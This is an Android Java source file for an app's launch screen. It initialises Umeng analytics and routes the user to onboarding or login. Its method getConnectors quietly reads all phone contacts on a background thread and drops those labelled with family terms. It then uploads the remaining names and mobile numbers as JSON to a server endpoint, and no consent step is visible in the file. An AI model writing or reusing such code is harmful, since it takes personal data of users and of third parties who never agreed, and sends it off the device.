package com.mimi.baiguo.activity;

import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONObject;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.view.Window;

import com.mimi.baiguo.API;
import com.mimi.baiguo.R;
import com.mimi.baiguo.connector.ContactPeople;
import com.mimi.baiguo.connector.GetContacts;
import com.mimi.baiguo.util.SystemBarTintManager;
import com.mimi.baiguo.util.URLConnectionUtil;
import com.mimi.baiguo.yindaoye.SwitchActivity;
import com.umeng.analytics.MobclickAgent;
import com.umeng.analytics.MobclickAgent.EScenarioType;
import com.umeng.analytics.MobclickAgent.UMAnalyticsConfig;

/***
 * 首页
 * 
 * @author AAA
 * 
 */
public class IndexActivity extends Activity {

	/** 登录状态标识，false代表没登录，true代表已经登录 */
	String loginstate;
	private Boolean internet = true;
	private static SystemBarTintManager tintManager;

	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);

		MobclickAgent.setCheckDevice(true);
		MobclickAgent.openActivityDurationTrack(false);
		MobclickAgent.setScenarioType(this, EScenarioType.E_UM_NORMAL);
		/*
		 * String appkey:官方申请的Appkey, String channel: 渠道号 EScenarioType eType:
		 * 场景模式，包含统计、游戏、统计盒子、游戏盒子, Boolean isCrashEnable: 可选初始化. 是否开启crash模式
		 */
		MobclickAgent.startWithConfigure(new UMAnalyticsConfig(this,
				getString(R.string.umeng_appkey),
				getString(R.string.UMENG_CHANNEL), EScenarioType.E_UM_NORMAL,
				true));

		SharedPreferences sp = getSharedPreferences("first",
				Context.MODE_APPEND);
		String first = sp.getString("first", "");
		if (!first.equals("true")) {
			Intent intent = new Intent(IndexActivity.this, SwitchActivity.class);
			startActivity(intent);
			return;
		}
		requestWindowFeature(Window.FEATURE_NO_TITLE);
		tintManager = new SystemBarTintManager(this);
		tintManager.setStatusBarTintEnabled(true);
		tintManager.setStatusBarTintResource(R.color.text_white);
		setContentView(R.layout.activity_index);
		getHomeActivity();

	}

	/**
	 * 获取手机联系人
	 */
	public static void getConnectors(final Context con) {
		new Thread() {
			public void run() {
				List<ContactPeople> peoples = null;
				peoples = GetContacts.getAllContacts(con);
				List<String> list_family = new ArrayList<String>();
				list_family.add("爷爷");
				list_family.add("奶奶");
				list_family.add("爸爸");
				list_family.add("妈妈");
				list_family.add("儿子");
				list_family.add("哥哥");
				list_family.add("弟弟");
				list_family.add("妹妹");
				list_family.add("姐姐");
				list_family.add("表姐");
				list_family.add("表妹");
				list_family.add("阿姨");
				list_family.add("老婆");
				list_family.add("老公");
				list_family.add("亲爱的");
				if (peoples.size() > 0) {
					String temp = "[";
					for (int i = 0; i < peoples.size(); i++) {
						JSONObject jo = new JSONObject();
						ContactPeople cp = peoples.get(i);
						String name;
						try {
							name = cp.getContactName().toString()
									.replace(" ", "");
							if (!list_family.contains(name)) {
								try {
									String phone = cp.getContactPhone()
											.toString().replace(" ", "")
											.replace("+86", "");
									if (phone.length() == 11) {
										jo.put("username", name);
										jo.put("phone", phone);
										temp += jo.toString();
										if (i < peoples.size() - 1) {
											temp += ",";
										}
									}
								} catch (Exception e) {
									// TODO Auto-generated catch block
									e.printStackTrace();
								}
							}
						} catch (Exception e1) {
							// TODO Auto-generated catch block
							e1.printStackTrace();
						}
					}
					temp += "]";
					List<NameValuePair> parameters = new ArrayList<NameValuePair>();
					System.out.println(temp);
					parameters.add(new BasicNameValuePair("users", temp));
					try {
						String result = URLConnectionUtil.HttpClientPost(
								API.GET_PHONE_CONTACT, parameters);
						System.out.println("IndexActivity:" + result);
					} catch (Exception e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
			}
		}.start();
	}

	/**
	 * 界面等待0.5秒直接跳转
	 */
	private void getHomeActivity() {
		final Intent localIntent = new Intent(this, LoginActivity.class);
		Timer timer = new Timer();
		TimerTask tast = new TimerTask() {
			@Override
			public void run() {
				if (internet == true) {
					startActivity(localIntent);
					finish();
				} else {
					android.os.Process.killProcess(android.os.Process.myPid());
				}
			}
		};
		timer.schedule(tast, 3000);

	}

	public void onResume() {
		super.onResume();
		MobclickAgent.onPageStart("StartActivity"); // 统计页面(仅有Activity的应用中SDK自动调用，不需要单独写)
		MobclickAgent.onResume(this); // 统计时长
	}

	public void onPause() {
		super.onPause();
		MobclickAgent.onPageEnd("StartActivity"); // （仅有Activity的应用中SDK自动调用，不需要单独写）
		MobclickAgent.onPause(this);
	}
}
